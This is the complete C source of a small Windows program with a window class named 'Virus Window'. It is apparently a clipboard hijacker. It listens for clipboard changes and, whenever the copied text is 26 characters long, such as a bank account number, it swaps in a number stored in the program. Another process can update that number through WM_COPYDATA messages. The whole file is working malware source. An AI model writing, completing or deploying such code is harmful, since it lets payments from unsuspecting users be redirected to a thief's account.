#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <stdio.h>

HWND hwnd;
char num[27] = {"77771234123412341234123412"};
COPYDATASTRUCT* pcds;
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Register the window class.
    const wchar_t CLASS_NAME[] = L"Virus Window";

    WNDCLASS wc = { };

    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Create the window.

    hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        CLASS_NAME,                     // Window class
        L"Learn to Program Windows",    // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL)
    {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    // Run the message loop.
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        AddClipboardFormatListener(hwnd);
        break;
    case WM_COPYDATA:
        pcds = (COPYDATASTRUCT*)lParam;
        if (pcds->dwData == 1)
        {
            char *arr= (char*)(pcds->lpData);
            memcpy(num, arr, 26);
            num[26] = 0;
        }
        InvalidateRect(hwnd, NULL, 0);
        break;
    case WM_DESTROY:
        RemoveClipboardFormatListener(hwnd);
        PostQuitMessage(0);
        return 0;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // All painting occurs here, between BeginPaint and EndPaint.
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_CLIPBOARDUPDATE:
        if (IsClipboardFormatAvailable(CF_TEXT)) {
            OpenClipboard(hwnd);
            HANDLE hData = GetClipboardData(CF_TEXT);
            LPVOID clipboard = GlobalLock(hData);
            char* clipboardChars = (char*)clipboard;
            
            if (clipboardChars == NULL) {
                break;
            }

            if (strlen(clipboardChars) == 26) {
                HGLOBAL hGlMem = GlobalAlloc(GHND, 27);
                char* dest = (char*)GlobalLock(hGlMem);
                memcpy(dest, num, 27);
                GlobalUnlock(hGlMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hGlMem);
            }
            GlobalUnlock(hData);
            CloseClipboard();
        }
        InvalidateRect(hwnd,NULL,0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}